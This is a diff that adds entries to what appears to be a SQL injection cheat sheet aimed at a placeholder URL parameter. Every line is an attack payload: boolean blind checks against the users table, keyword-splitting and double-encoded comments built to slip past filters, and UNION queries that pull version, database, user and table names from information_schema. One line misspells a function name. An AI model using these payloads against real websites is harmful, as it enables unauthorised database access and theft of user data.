@@ -23,3 +23,11 @@ www.site.com/home.php?id=-2 %00(!*unIoN*)union+(!*SelEcT*)select+1,%3a,2,%3a,3,%
 www.site.com/home.php?id=-2“或1=1--
 www.site.com/home.php?id=-2'或1=1--
 www.site.com/home.php?id=null %2575%256e%2569%256f%256e%2520%2573%2565%256c%2565%2563%2574%201,2,3--
+www.site.com/home.php?id=-2 || (select substr(gruop_concat(user_id),1,1) user from users ) = 1
+www.site.com/home.php?id=-2 || (select user from users limit 1) = 'admin'
+www.site.com/home.php?id=-2 || substr(user,1,1) = lower(conv(11,10,36))
+www.site.com/home.php?id=-2 1%0b||%0blpad(user,7,1)
+www.site.com/home.php?id=-2+UNunionION+SEselectLECT+1,2,3--
+www.site.com/home.php?id=-2%252f%252a*/union%252f%252a /select%252f%252a*/1,2,3%252f%252a*/from%252f%252a*/users--
+www.site.com/home.php?id=-2+and+(select 1)=(select 0x414141414141441414141414114141414141414141414141414141414141414141.)+union+select+1,2,version(),database(),user(),6,7,8,9,10--
+www.site.com/home.php?id=-2/*!UnIoN*/+/*!SeLecT*/+1,2,concat(/*!table_name*/)+FrOm/*!information_schema*/.tables/*!WhErE*/+/*!TaBlE_sChEMa*/+like+database()--
